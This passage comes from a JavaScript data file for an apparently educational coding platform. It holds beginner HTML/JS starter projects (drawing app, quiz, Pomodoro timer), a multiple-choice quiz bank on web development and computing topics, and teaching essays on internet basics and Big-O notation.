      code: '<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>Draw</title>\n  <style>\n    body { font-family: system-ui; margin: 20px; }\n    .toolbar { display: flex; gap: 16px; align-items: center; margin-bottom: 16px; padding: 12px; background: #f3f4f6; border-radius: 8px; }\n    canvas { border: 2px solid #333; cursor: crosshair; background: white; }\n    button { padding: 8px 14px; cursor: pointer; }\n  </style>\n</head>\n<body>\n  <h1>Drawing App</h1>\n  <div class="toolbar">\n    <label for="color">Color:</label>\n    <input type="color" id="color" value="#000000">\n    \n    <label for="size">Size:</label>\n    <input type="range" id="size" min="1" max="20" value="3">\n    <span id="sizeLabel">3</span>\n    \n    <button id="clear">Clear</button>\n    <button id="save">Save</button>\n  </div>\n  \n  <canvas id="canvas" width="800" height="500" aria-label="Drawing canvas. Use mouse to draw."></canvas>\n  \n  <script>\n    const canvas = document.getElementById("canvas");\n    const ctx = canvas.getContext("2d");\n    const colorEl = document.getElementById("color");\n    const sizeEl = document.getElementById("size");\n    const sizeLabel = document.getElementById("sizeLabel");\n    let isDrawing = false;\n    \n    sizeEl.addEventListener("input", function() {\n      sizeLabel.textContent = sizeEl.value;\n    });\n    \n    canvas.addEventListener("mousedown", function(e) {\n      isDrawing = true;\n      ctx.beginPath();\n      ctx.moveTo(e.offsetX, e.offsetY);\n    });\n    \n    canvas.addEventListener("mousemove", function(e) {\n      if (!isDrawing) return;\n      ctx.strokeStyle = colorEl.value;\n      ctx.lineWidth = parseInt(sizeEl.value);\n      ctx.lineCap = "round";\n      ctx.lineTo(e.offsetX, e.offsetY);\n      ctx.stroke();\n    });\n    \n    canvas.addEventListener("mouseup", function() { isDrawing = false; });\n    canvas.addEventListener("mouseleave", function() { isDrawing = false; });\n    \n    document.getElementById("clear").addEventListener("click", function() {\n      ctx.clearRect(0, 0, canvas.width, canvas.height);\n    });\n    \n    document.getElementById("save").addEventListener("click", function() {\n      const link = document.createElement("a");\n      link.download = "drawing.png";\n      link.href = canvas.toDataURL();\n      link.click();\n    });\n  </script>\n</body>\n</html>',
      whatNext: 'Add eraser tool. Add undo. Add fill bucket. Add shapes (rectangle, circle).',
    },
    {
      id: 'starter_quiz',
      title: 'Quiz App with Score',
      description: 'Quiz app with multiple-choice questions + scoring + review.',
      code: '<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>Quiz</title>\n  <style>\n    body { font-family: system-ui; max-width: 700px; margin: 40px auto; padding: 20px; }\n    .question { background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 16px 0; }\n    .question h3 { margin-top: 0; }\n    label { display: block; padding: 8px 0; cursor: pointer; }\n    button { padding: 12px 24px; background: #2563eb; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 16px; }\n    .result { background: #dcfce7; padding: 20px; border-radius: 8px; margin-top: 20px; }\n    .result.bad { background: #fee2e2; }\n    .correct { color: #166534; font-weight: bold; }\n    .incorrect { color: #dc2626; }\n  </style>\n</head>\n<body>\n  <h1>Take the Quiz!</h1>\n  <form id="quizForm">\n    <div class="question">\n      <h3>1. What does HTML stand for?</h3>\n      <label><input type="radio" name="q1" value="a"> HyperText Markup Language</label>\n      <label><input type="radio" name="q1" value="b"> High Tech Markup Language</label>\n      <label><input type="radio" name="q1" value="c"> Hyperlinks and Text Manager</label>\n      <label><input type="radio" name="q1" value="d"> HighTech Modern Lang</label>\n    </div>\n    \n    <div class="question">\n      <h3>2. Which CSS property changes text color?</h3>\n      <label><input type="radio" name="q2" value="a"> font-color</label>\n      <label><input type="radio" name="q2" value="b"> text-color</label>\n      <label><input type="radio" name="q2" value="c"> color</label>\n      <label><input type="radio" name="q2" value="d"> text-style</label>\n    </div>\n    \n    <div class="question">\n      <h3>3. What does JS stand for?</h3>\n      <label><input type="radio" name="q3" value="a"> Just Scripts</label>\n      <label><input type="radio" name="q3" value="b"> JavaScript</label>\n      <label><input type="radio" name="q3" value="c"> Java Source</label>\n      <label><input type="radio" name="q3" value="d"> Java Style</label>\n    </div>\n    \n    <button type="submit">Submit Quiz</button>\n  </form>\n  <div id="result"></div>\n  \n  <script>\n    const correctAnswers = { q1: "a", q2: "c", q3: "b" };\n    const explanations = {\n      q1: { a: "Correct! HTML = HyperText Markup Language.", b: "No — HyperText.", c: "No — HyperText.", d: "No — HyperText." },\n      q2: { a: "No — just \\"color\\".", b: "No — just \\"color\\".", c: "Correct! CSS property is just \\"color\\".", d: "No — color." },\n      q3: { a: "No — JavaScript.", b: "Correct! JS = JavaScript.", c: "No — JavaScript.", d: "No — JavaScript." }\n    };\n    \n    document.getElementById("quizForm").addEventListener("submit", function(e) {\n      e.preventDefault();\n      let score = 0;\n      const total = Object.keys(correctAnswers).length;\n      const data = new FormData(this);\n      \n      Object.keys(correctAnswers).forEach(function(q) {\n        if (data.get(q) === correctAnswers[q]) score++;\n      });\n      \n      const result = document.getElementById("result");\n      result.className = "result " + (score === total ? "" : "bad");\n      result.innerHTML = "<h3>Score: " + score + "/" + total + "</h3>";\n      \n      Object.keys(correctAnswers).forEach(function(q) {\n        const userAnswer = data.get(q);\n        const correct = userAnswer === correctAnswers[q];\n        const cls = correct ? "correct" : "incorrect";\n        const note = explanations[q][userAnswer] || "Not answered.";\n        result.innerHTML += "<p class=\\"" + cls + "\\"><strong>Q" + q.substring(1) + ":</strong> " + note + "</p>";\n      });\n    });\n  </script>\n</body>\n</html>',
      whatNext: 'Add more questions. Add timer. Save high scores in localStorage.',
    },
    {
      id: 'starter_pomodoro',
      title: 'Pomodoro Timer',
      description: 'A productivity timer with work + break sessions.',
      code: '<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>Pomodoro</title>\n  <style>\n    body { font-family: system-ui; text-align: center; padding: 40px; max-width: 500px; margin: 0 auto; background: linear-gradient(180deg, #f0f9ff, #dbeafe); min-height: 100vh; }\n    h1 { color: #1e40af; }\n    .timer { font-size: 80px; font-family: monospace; margin: 20px 0; color: #1e40af; }\n    .label { font-size: 18px; color: #475569; margin-bottom: 10px; }\n    button { padding: 12px 24px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; margin: 4px; }\n    .primary { background: #2563eb; color: white; }\n    .secondary { background: #cbd5e1; color: #475569; }\n    .progress { width: 100%; height: 16px; background: #e2e8f0; border-radius: 8px; overflow: hidden; margin: 16px 0; }\n    .bar { height: 100%; background: linear-gradient(90deg, #2563eb, #1e40af); transition: width 1s linear; }\n  </style>\n</head>\n<body>\n  <h1>🍅 Pomodoro Timer</h1>\n  <p class="label" id="mode">Work session</p>\n  <div class="progress"><div class="bar" id="progressBar"></div></div>\n  <div class="timer" id="display" role="timer" aria-live="polite">25:00</div>\n  \n  <button class="primary" id="start">Start</button>\n  <button class="secondary" id="pause">Pause</button>\n  <button class="secondary" id="reset">Reset</button>\n  \n  <script>\n    const WORK_DURATION = 25 * 60; // 25 minutes\n    const BREAK_DURATION = 5 * 60; // 5 minutes\n    let secondsLeft = WORK_DURATION;\n    let timer = null;\n    let isWorkMode = true;\n    \n    const display = document.getElementById("display");\n    const mode = document.getElementById("mode");\n    const progressBar = document.getElementById("progressBar");\n    const startBtn = document.getElementById("start");\n    \n    function format(s) {\n      const m = Math.floor(s / 60);\n      const r = s % 60;\n      return String(m).padStart(2, "0") + ":" + String(r).padStart(2, "0");\n    }\n    \n    function update() {\n      display.textContent = format(secondsLeft);\n      const total = isWorkMode ? WORK_DURATION : BREAK_DURATION;\n      const percent = ((total - secondsLeft) / total) * 100;\n      progressBar.style.width = percent + "%";\n      \n      if (secondsLeft === 0) {\n        clearInterval(timer);\n        timer = null;\n        // Play sound\n        try { new Audio("data:audio/wav;base64,UklGRpwAAABXQVZFZm10IAEAAAEAAQBAHwAAQB8AAAEACABkYXRhcwAAAA==").play(); } catch(e) {}\n        // Switch mode\n        isWorkMode = !isWorkMode;\n        secondsLeft = isWorkMode ? WORK_DURATION : BREAK_DURATION;\n        mode.textContent = isWorkMode ? "Work session" : "Break time!";\n        // Auto-pause; user clicks Start to begin next\n        startBtn.textContent = "Start";\n      }\n    }\n    \n    startBtn.addEventListener("click", function() {\n      if (!timer) {\n        timer = setInterval(function() {\n          secondsLeft--;\n          update();\n        }, 1000);\n        startBtn.textContent = "Running...";\n      }\n    });\n    \n    document.getElementById("pause").addEventListener("click", function() {\n      clearInterval(timer);\n      timer = null;\n      startBtn.textContent = "Start";\n    });\n    \n    document.getElementById("reset").addEventListener("click", function() {\n      clearInterval(timer);\n      timer = null;\n      secondsLeft = WORK_DURATION;\n      isWorkMode = true;\n      mode.textContent = "Work session";\n      startBtn.textContent = "Start";\n      update();\n    });\n    \n    update();\n  </script>\n</body>\n</html>',
      whatNext: 'Customize durations. Add notifications. Track sessions completed.',
    },
  ];

  // ─── Extended quiz bank (Q31-Q90) ─────────────────────────────────
  var QUIZ_QUESTIONS_EXTENDED = [
    { id: 'q31', domain: 'HTML', difficulty: 'Beginner', q: 'Which tag is used for a paragraph?', a1: '<para>', a2: '<text>', a3: '<p>', a4: '<paragraph>', correct: 3, why: '<p> is the standard tag for a paragraph in HTML.' },
    { id: 'q32', domain: 'HTML', difficulty: 'Beginner', q: 'Which tag creates a link?', a1: '<link>', a2: '<a>', a3: '<href>', a4: '<url>', correct: 2, why: '<a> with href attribute creates a hyperlink.' },
    { id: 'q33', domain: 'HTML', difficulty: 'Beginner', q: 'What does the lang attribute on <html> do?', a1: 'Sets the language of the document for screen readers', a2: 'Translates the page', a3: 'Sets the programming language', a4: 'Selects the font', correct: 1, why: 'lang helps screen readers + sets text direction.' },
    { id: 'q34', domain: 'HTML', difficulty: 'Beginner', q: 'Which tag should you use for a button?', a1: '<div onclick>', a2: '<button>', a3: '<click>', a4: '<a onclick>', correct: 2, why: '<button> is the semantic + accessible choice.' },
    { id: 'q35', domain: 'HTML', difficulty: 'Intermediate', q: 'What does <main> indicate?', a1: 'The first paragraph', a2: 'The main content area of the page', a3: 'The most important word', a4: 'Nothing — it\'s not a real tag', correct: 2, why: '<main> is a landmark for the primary content.' },
    { id: 'q36', domain: 'CSS', difficulty: 'Beginner', q: 'Which CSS rule changes text color?', a1: 'color: blue;', a2: 'text-color: blue;', a3: 'font-color: blue;', a4: 'background: blue;', correct: 1, why: 'color is the CSS property for text color.' },
    { id: 'q37', domain: 'CSS', difficulty: 'Beginner', q: 'What does padding do?', a1: 'Space outside the element', a2: 'Space inside the element', a3: 'Sets the size of element', a4: 'Aligns the element', correct: 2, why: 'padding is inside the element. margin is outside.' },
    { id: 'q38', domain: 'CSS', difficulty: 'Intermediate', q: 'What does display: flex enable?', a1: 'Flexible 1D layout', a2: 'Bold text', a3: 'Italic style', a4: 'Hides element', correct: 1, why: 'display: flex enables Flexbox 1D layout.' },
    { id: 'q39', domain: 'CSS', difficulty: 'Intermediate', q: 'What does @media (max-width: 768px) do?', a1: 'Hides the element on mobile', a2: 'Applies styles only on mobile (≤768px)', a3: 'Resizes images for mobile', a4: 'Translates to mobile', correct: 2, why: 'Media queries apply styles conditionally based on viewport size.' },
    { id: 'q40', domain: 'CSS', difficulty: 'Advanced', q: 'What does :focus-visible do?', a1: 'Applies on hover', a2: 'Applies when element has keyboard focus (not just programmatic)', a3: 'Same as :focus', a4: 'Disables focus', correct: 2, why: ':focus-visible only matches when focus is from keyboard, not mouse click. Useful for keyboard-only accessibility indicators.' },
    { id: 'q41', domain: 'JavaScript', difficulty: 'Beginner', q: 'What does typeof "hello" return?', a1: 'string', a2: 'number', a3: 'array', a4: 'object', correct: 1, why: 'typeof returns "string" for string values.' },
    { id: 'q42', domain: 'JavaScript', difficulty: 'Beginner', q: 'Which loop runs at least once?', a1: 'while', a2: 'do...while', a3: 'for', a4: 'None of the above', correct: 2, why: 'do...while always runs the body once before checking condition.' },
    { id: 'q43', domain: 'JavaScript', difficulty: 'Intermediate', q: 'How do you create an array of 5 zeros?', a1: 'new Array(5)', a2: 'Array.from({length:5}, () => 0)', a3: '[0]*5', a4: 'array(5,0)', correct: 2, why: 'new Array(5) creates an array of length 5 but with empty slots. Use Array.from or .fill().' },
    { id: 'q44', domain: 'JavaScript', difficulty: 'Intermediate', q: 'What does Array.prototype.map() do?', a1: 'Sorts the array', a2: 'Returns new array with transformed elements', a3: 'Modifies array in place', a4: 'Removes duplicates', correct: 2, why: 'map() returns a new array. It does NOT modify the original.' },
    { id: 'q45', domain: 'JavaScript', difficulty: 'Intermediate', q: 'What is destructuring?', a1: 'Crashing on purpose', a2: 'Extracting values from arrays/objects into variables', a3: 'Deleting variables', a4: 'A type of loop', correct: 2, why: 'Destructuring lets you do: const { name } = person; or const [a, b] = arr;' },
    { id: 'q46', domain: 'JavaScript', difficulty: 'Intermediate', q: 'What is hoisting?', a1: 'Lifting heavy objects', a2: 'JS moves declarations to top of scope', a3: 'Renaming variables', a4: 'A type of error', correct: 2, why: 'var declarations are hoisted (visible above declaration). let + const are not (Temporal Dead Zone).' },
    { id: 'q47', domain: 'JavaScript', difficulty: 'Advanced', q: 'What is the event loop?', a1: 'A type of for loop', a2: 'How JS handles async operations + queues callbacks', a3: 'A library for events', a4: 'Used for animation', correct: 2, why: 'JS is single-threaded. The event loop coordinates async tasks (setTimeout, fetch, etc.) with the main thread.' },
    { id: 'q48', domain: 'JavaScript', difficulty: 'Advanced', q: 'What is a Promise.all()?', a1: 'Runs all promises sequentially', a2: 'Runs all promises in parallel, resolves when ALL succeed', a3: 'Always resolves successfully', a4: 'Cancels promises', correct: 2, why: 'Promise.all([p1, p2, p3]) runs in parallel, resolves with array of results. Fails fast if ANY rejects.' },
    { id: 'q49', domain: 'JavaScript', difficulty: 'Advanced', q: 'What does Object.freeze() do?', a1: 'Makes object immutable', a2: 'Deletes object', a3: 'Sorts object keys', a4: 'Encrypts object', correct: 1, why: 'Object.freeze prevents adding/changing/removing properties. Useful for constants.' },
    { id: 'q50', domain: 'Accessibility', difficulty: 'Beginner', q: 'What\'s the recommended minimum touch target size?', a1: '24x24px', a2: '44x44px', a3: '60x60px', a4: '100x100px', correct: 2, why: 'WCAG 2.5.5 recommends 44x44px minimum.' },
    { id: 'q51', domain: 'Accessibility', difficulty: 'Intermediate', q: 'What\'s the difference between aria-label + aria-labelledby?', a1: 'aria-label takes text; aria-labelledby takes an ID reference', a2: 'They\'re the same', a3: 'aria-label is for ARIA only; aria-labelledby is for HTML', a4: 'aria-labelledby is older', correct: 1, why: 'aria-label has direct text. aria-labelledby points to an element\'s ID that provides the label.' },
    { id: 'q52', domain: 'Accessibility', difficulty: 'Advanced', q: 'What is role="presentation"?', a1: 'Makes element invisible', a2: 'Tells AT to skip element\'s semantic role', a3: 'Promotes element to landmark', a4: 'Makes element interactive', correct: 2, why: 'role="presentation" makes an element\'s semantics inaccessible. Useful for purely decorative elements.' },
    { id: 'q53', domain: 'AP CSP', difficulty: 'Intermediate', q: 'What is "computing innovation" in AP CSP?', a1: 'Innovation that benefits humans', a2: 'Computing technology that can have beneficial or harmful effects', a3: 'Free software', a4: 'New programming languages', correct: 2, why: 'AP CSP CRD-1 defines innovation broadly + considers both positive + negative impacts.' },
    { id: 'q54', domain: 'AP CSP', difficulty: 'Intermediate', q: 'What is "personally identifiable information" (PII)?', a1: 'Data about you that identifies you', a2: 'Public information', a3: 'Anonymized data', a4: 'Email metadata', correct: 1, why: 'PII includes name, address, SSN, biometrics, etc. Strict legal protections in many jurisdictions.' },
    { id: 'q55', domain: 'AP CSP', difficulty: 'Advanced', q: 'What is "the digital divide"?', a1: 'Different programming styles', a2: 'Unequal access to computing technology', a3: 'Slow vs fast internet', a4: 'Different operating systems', correct: 2, why: 'Digital divide refers to unequal access — by income, geography, disability, age. AP CSP IOC-1.B.' },
    { id: 'q56', domain: 'AP CSP', difficulty: 'Advanced', q: 'What is "algorithmic bias"?', a1: 'When algorithms run faster', a2: 'When algorithms produce unfair outcomes for certain groups', a3: 'When developers prefer certain algorithms', a4: 'When algorithms have bugs', correct: 2, why: 'Algorithmic bias is unfair outcomes from algorithms, often reflecting biases in training data. AP CSP IOC-1.C.' },
    { id: 'q57', domain: 'Algorithms', difficulty: 'Intermediate', q: 'What is recursion?', a1: 'A function calling itself', a2: 'A type of loop', a3: 'An infinite call', a4: 'Memory allocation', correct: 1, why: 'Recursion is when a function calls itself, typically with a base case to stop.' },
    { id: 'q58', domain: 'Algorithms', difficulty: 'Intermediate', q: 'What\'s the complexity of bubble sort?', a1: 'O(1)', a2: 'O(n)', a3: 'O(n²)', a4: 'O(log n)', correct: 3, why: 'Bubble sort compares every pair, giving O(n²).' },
    { id: 'q59', domain: 'Algorithms', difficulty: 'Advanced', q: 'What\'s memoization?', a1: 'Sorting arrays', a2: 'Caching function results to avoid recomputation', a3: 'A type of recursion', a4: 'A way to handle errors', correct: 2, why: 'Memoization caches function results by their arguments. Useful for expensive pure functions.' },
    { id: 'q60', domain: 'Web', difficulty: 'Intermediate', q: 'What does CORS mean?', a1: 'Computer Resource System', a2: 'Cross-Origin Resource Sharing', a3: 'Coordinated Origin Routing Service', a4: 'Cookie Origin Stamping', correct: 2, why: 'CORS controls which sites can access resources from your domain. Browser security feature.' },
    { id: 'q61', domain: 'Web', difficulty: 'Intermediate', q: 'What does CDN mean?', a1: 'Computer Data Network', a2: 'Content Delivery Network — distributed cache for static content', a3: 'Centralized Domain Name', a4: 'Custom Data Norm', correct: 2, why: 'CDN puts content on servers near users, speeding delivery.' },
    { id: 'q62', domain: 'Web', difficulty: 'Advanced', q: 'What\'s the difference between client-side + server-side rendering?', a1: 'Client renders in browser; server renders pre-built HTML', a2: 'Same thing', a3: 'Client is fast; server is slow', a4: 'Server is fast; client is slow', correct: 1, why: 'CSR: browser builds DOM dynamically with JS. SSR: server generates final HTML. Different tradeoffs.' },
    { id: 'q63', domain: 'Data', difficulty: 'Beginner', q: 'What does JSON stand for?', a1: 'JavaScript Object Notation', a2: 'Java Standard Object Network', a3: 'Java Source Online Network', a4: 'Just Some Object Names', correct: 1, why: 'JSON is a way to represent data structurally in text form. Used everywhere.' },
    { id: 'q64', domain: 'Data', difficulty: 'Intermediate', q: 'What\'s the difference between localStorage + sessionStorage?', a1: 'Same thing', a2: 'localStorage persists across sessions; sessionStorage only lasts as long as tab is open', a3: 'sessionStorage is more secure', a4: 'localStorage requires permission', correct: 2, why: 'localStorage: persists. sessionStorage: tab-only.' },
    { id: 'q65', domain: 'Data', difficulty: 'Advanced', q: 'What\'s a relational database?', a1: 'Database with relationships between tables', a2: 'A database for friends', a3: 'A type of NoSQL', a4: 'A simple list', correct: 1, why: 'Relational databases (SQL) have tables with foreign keys connecting them. Examples: MySQL, PostgreSQL.' },
    { id: 'q66', domain: 'Git', difficulty: 'Beginner', q: 'What is "git status" for?', a1: 'Send code to GitHub', a2: 'See what files have changed', a3: 'Delete history', a4: 'Roll back', correct: 2, why: 'git status shows what\'s changed since last commit + what\'s staged.' },
    { id: 'q67', domain: 'Git', difficulty: 'Intermediate', q: 'What\'s "git rebase" vs "git merge"?', a1: 'Same thing', a2: 'Merge creates merge commit; rebase rewrites history', a3: 'Merge is dangerous; rebase is safe', a4: 'Rebase is older', correct: 2, why: 'Merge preserves all commit history. Rebase re-applies commits on top of latest main, making linear history.' },
    { id: 'q68', domain: 'Git', difficulty: 'Advanced', q: 'When should you NOT rebase?', a1: 'On private branches', a2: 'On shared branches (others depend on them)', a3: 'Always', a4: 'Never', correct: 2, why: 'Rebasing rewrites history. Don\'t rebase shared branches — it breaks others\' work.' },
    { id: 'q69', domain: 'Security', difficulty: 'Beginner', q: 'What\'s "phishing"?', a1: 'Sending malicious code', a2: 'Tricking users to give credentials via fake login', a3: 'Hacking servers', a4: 'Looking for bugs', correct: 2, why: 'Phishing is social engineering — fake emails/sites that trick users.' },
    { id: 'q70', domain: 'Security', difficulty: 'Intermediate', q: 'Why is HTTPS important?', a1: 'It\'s faster', a2: 'It encrypts data between browser + server, preventing eavesdropping + tampering', a3: 'It\'s standard', a4: 'It looks cool', correct: 2, why: 'HTTPS uses TLS to encrypt traffic. Required for any sensitive data.' },
    { id: 'q71', domain: 'Security', difficulty: 'Advanced', q: 'What\'s a "man-in-the-middle" attack?', a1: 'Server hacked', a2: 'Attacker intercepts traffic between two parties', a3: 'Client hacked', a4: 'Random encryption', correct: 2, why: 'MITM: attacker positions self between client + server to intercept/modify traffic. HTTPS prevents this.' },
    { id: 'q72', domain: 'Software Engineering', difficulty: 'Beginner', q: 'What\'s "code review"?', a1: 'Reading old code', a2: 'Someone else reads + suggests improvements to your code before merging', a3: 'Auto-generated review', a4: 'Reviewing courses', correct: 2, why: 'Code review is standard practice. Catches bugs + improves quality + spreads knowledge.' },
    { id: 'q73', domain: 'Software Engineering', difficulty: 'Intermediate', q: 'What\'s "technical debt"?', a1: 'Money owed for software', a2: 'Cost of taking shortcuts in code — you pay later in maintenance', a3: 'Servers cost', a4: 'License fees', correct: 2, why: 'Quick + dirty solutions create debt. Refactoring later "pays it down."' },
    { id: 'q74', domain: 'Software Engineering', difficulty: 'Advanced', q: 'What\'s SOLID?', a1: 'A programming language', a2: 'Five principles of object-oriented design', a3: 'A coding company', a4: 'A type of code review', correct: 2, why: 'SOLID: Single responsibility, Open/closed, Liskov substitution, Interface segregation, Dependency inversion.' },
    { id: 'q75', domain: 'AI/ML', difficulty: 'Beginner', q: 'What\'s an LLM?', a1: 'Light Linear Math', a2: 'Large Language Model — neural network trained on text', a3: 'Lightweight Logic Module', a4: 'Linear Memory Manager', correct: 2, why: 'LLMs like GPT, Gemini, Claude generate text + code by predicting next tokens.' },
    { id: 'q76', domain: 'AI/ML', difficulty: 'Intermediate', q: 'What\'s a "hallucination" in AI?', a1: 'AI dreaming', a2: 'AI generating false information with confidence', a3: 'AI being creative', a4: 'AI bug', correct: 2, why: 'AI confidently generates wrong facts. Always verify AI output.' },
    { id: 'q77', domain: 'AI/ML', difficulty: 'Advanced', q: 'What\'s "training data" in ML?', a1: 'Data used to teach a model', a2: 'Data tested on the model', a3: 'Live user data', a4: 'Random data', correct: 1, why: 'Models learn patterns from training data. Quality + bias of training data affects model output.' },
    { id: 'q78', domain: 'Performance', difficulty: 'Beginner', q: 'What is "lazy loading"?', a1: 'Loading takes forever', a2: 'Load only what\'s needed when needed', a3: 'Programmer doesn\'t work hard', a4: 'A slow loading state', correct: 2, why: 'Lazy loading: defer loading until needed. Faster initial load.' },
    { id: 'q79', domain: 'Performance', difficulty: 'Intermediate', q: 'What\'s a "render-blocking resource"?', a1: 'A resource that prevents page from displaying until it loads', a2: 'A blocked image', a3: 'A type of error', a4: 'Server-side', correct: 1, why: 'Synchronous CSS + JS that loads before HTML can render. Slows initial display.' },
    { id: 'q80', domain: 'Performance', difficulty: 'Advanced', q: 'What\'s the "Critical Rendering Path"?', a1: 'Path to deploy code', a2: 'Steps the browser takes to render the page (HTML → CSSOM → render tree → layout → paint)', a3: 'A code review step', a4: 'A type of CSS', correct: 2, why: 'Understanding CRP helps optimize for faster page rendering. Key concept for performance.' },
    { id: 'q81', domain: 'Mobile', difficulty: 'Intermediate', q: 'What\'s "responsive design"?', a1: 'Slow design', a2: 'Designs that adapt to screen size', a3: 'Reactive emails', a4: 'Loading animations', correct: 2, why: 'Responsive design uses CSS to adapt layouts across screen sizes.' },
    { id: 'q82', domain: 'Mobile', difficulty: 'Advanced', q: 'What\'s a "PWA"?', a1: 'Program With Apps', a2: 'Progressive Web App — installable web app', a3: 'Public Web Access', a4: 'Personal Web Address', correct: 2, why: 'PWAs work offline, install on home screen, send push notifications. Bridge web + mobile.' },
    { id: 'q83', domain: 'Web', difficulty: 'Beginner', q: 'What does "URL" stand for?', a1: 'Universal Resource Locator', a2: 'Uniform Resource Locator', a3: 'United Resource Link', a4: 'Universal Reference Link', correct: 2, why: 'URL = Uniform Resource Locator. Identifies a resource on the web.' },
    { id: 'q84', domain: 'Web', difficulty: 'Intermediate', q: 'What\'s a "REST API"?', a1: 'API for sleeping', a2: 'Architectural style for APIs using HTTP verbs (GET, POST, PUT, DELETE)', a3: 'A relaxing programming style', a4: 'A type of error', correct: 2, why: 'REST is a standard style for APIs. GET reads, POST creates, PUT updates, DELETE removes.' },
    { id: 'q85', domain: 'Web', difficulty: 'Advanced', q: 'What\'s "GraphQL" vs "REST"?', a1: 'Same thing', a2: 'GraphQL lets clients request specific data shapes; REST is endpoint-based', a3: 'GraphQL is older', a4: 'REST is more powerful', correct: 2, why: 'GraphQL solves over-fetching in REST. Clients ask for exactly what they need.' },
    { id: 'q86', domain: 'Frontend', difficulty: 'Intermediate', q: 'What\'s the Virtual DOM?', a1: 'A magic DOM', a2: 'An in-memory representation that gets diffed + applied to real DOM', a3: 'A faked element', a4: 'A 3D version', correct: 2, why: 'React + Vue use Virtual DOM. Diff old + new → minimal DOM updates → faster than full re-render.' },
    { id: 'q87', domain: 'Frontend', difficulty: 'Advanced', q: 'What is "hydration" in SSR?', a1: 'Watering server', a2: 'Adding interactivity to server-rendered HTML', a3: 'Drinking coffee', a4: 'Cleaning servers', correct: 2, why: 'SSR sends HTML, then JS "hydrates" it with event handlers + reactivity.' },
    { id: 'q88', domain: 'Frontend', difficulty: 'Beginner', q: 'What does the DOM stand for?', a1: 'Data Object Model', a2: 'Document Object Model', a3: 'Display Object Mode', a4: 'Document Order Model', correct: 2, why: 'DOM = Document Object Model. The browser\'s representation of HTML as JS-accessible objects.' },
    { id: 'q89', domain: 'Frontend', difficulty: 'Advanced', q: 'What\'s an "Immediately Invoked Function Expression" (IIFE)?', a1: 'A function that runs immediately', a2: 'A function that returns void', a3: 'A function inside a loop', a4: 'A modern import', correct: 1, why: 'IIFE: (function() { ... })(). Runs once + creates a scope. Pre-modules pattern for encapsulation.' },
    { id: 'q90', domain: 'Frontend', difficulty: 'Advanced', q: 'What is "JSX" in React?', a1: 'JavaScript XML — syntax for writing HTML in JS', a2: 'JSON Extended', a3: 'Just Some XML', a4: 'JavaScript XHR', correct: 1, why: 'JSX lets React components return XML-like syntax. Compiled to JS before runtime.' },
  ];

  // ─── In-depth deep-dive topics (long-form pedagogical essays) ────
  var DEEP_DIVES = [
    {
      title: 'How the Internet Actually Works',
      domain: 'Networking + AP CSP',
      content: 'When you type "wikipedia.org" into your browser + press Enter, an extraordinary sequence happens in milliseconds.\n\nFirst, your browser asks: "What IP address is wikipedia.org?" It queries a DNS server. DNS (Domain Name System) is a distributed phonebook that maps human-readable names to numeric IP addresses. Wikipedia.org might resolve to something like 208.80.154.224.\n\nThen your browser opens a connection to that IP. The connection goes through several intermediaries: your router, your ISP, then long-haul fiber networks, then eventually Wikipedia\'s server. Each hop is a separate physical link.\n\nThe HTTP request (a simple text message saying "GET /Wikipedia") is sent. It\'s broken into packets. Each packet has the destination IP + a sequence number. Packets find their way to the destination through the internet\'s routing infrastructure — even if a particular path fails, packets can route around it. This is why the internet is "fault-tolerant" (AP CSP CSN-1.D).\n\nThe Wikipedia server receives the request, generates the HTML page (often dynamically from a database), + sends it back as packets. Your browser reassembles the packets, parses the HTML, requests any embedded resources (images, CSS, JS), + renders the page.\n\nAll of this happens in 100-500 milliseconds. The internet is one of the most complex engineered systems humans have built. It\'s also remarkably reliable.\n\nKey concepts to teach:\n- DNS: the phonebook that translates names to IPs\n- IP addresses: unique numbers that identify each device\n- Packets: small chunks of data with addressing information\n- Routing: how packets find their way through the network\n- Fault tolerance: why the internet keeps working even when parts fail\n\nFor classroom: have students trace what happens when they load their favorite website. Use traceroute (or Tracert on Windows). Discuss what they see.',
      classroomActivities: [
        'Use traceroute to map paths to different websites',
        'Diagram the request/response flow',
        'Discuss what happens when a fiber cable is cut',
        'Compare wired vs wireless networking',
      ],
    },
    {
      title: 'Why Algorithms Matter (Big-O Notation Explained)',
      domain: 'Algorithms + AP CSP',
      content: 'Two algorithms can do the same thing but with vastly different performance. Big-O notation describes how an algorithm\'s runtime grows with input size.\n\nO(1) — Constant. Runtime doesn\'t depend on input size. Example: accessing an array by index.\n\nO(log n) — Logarithmic. Doubling input adds a constant amount of work. Example: binary search.\n\nO(n) — Linear. Runtime proportional to input. Example: finding an item in an unsorted array.\n\nO(n log n) — Linearithmic. Slightly more than linear. Example: efficient sorting (merge sort, quick sort).\n\nO(n²) — Quadratic. Bad for large inputs. Example: comparing every pair in an array.\n\nO(2^n) — Exponential. Effectively unusable for large inputs. Example: naive Fibonacci recursion.\n\nO(n!) — Factorial. Truly bad. Example: brute-force traveling salesman.\n\nLet\'s see this in practice. Suppose n = 1000.\n\nO(1):     1 operation\nO(log n): ~10 operations\nO(n):     1000 operations\nO(n log n): ~10,000 operations\nO(n²):   1,000,000 operations\nO(2^n): ~10^301 operations (more than atoms in the universe!)\n\nWhy does this matter? Real-world data is big.\n\nSorting 1000 names? O(n²) is fine. Sorting 1 billion records? O(n²) takes years; O(n log n) takes minutes.\n\nSearching a database of 1 million users? O(log n) (with proper indexing) takes 20 lookups. O(n) takes 1 million.\n\nThis is why CS theory matters. Picking the right algorithm = the difference between an instant app + an unusable one.\n\nThe Big-O ladder is the foundation of algorithm analysis.',
      classroomActivities: [
        'Implement linear search + binary search. Time both on increasing array sizes.',
        'Implement bubble sort + quick sort. Time both.',
        'Graph runtimes. Match to Big-O curves.',
        'Discuss real-world cases (Netflix recommendations, Google search) + which Big-O applies.',
      ],
    },
    {
      title: 'AI + LLMs: How They Generate Code',
      domain: 'AI + ethics',
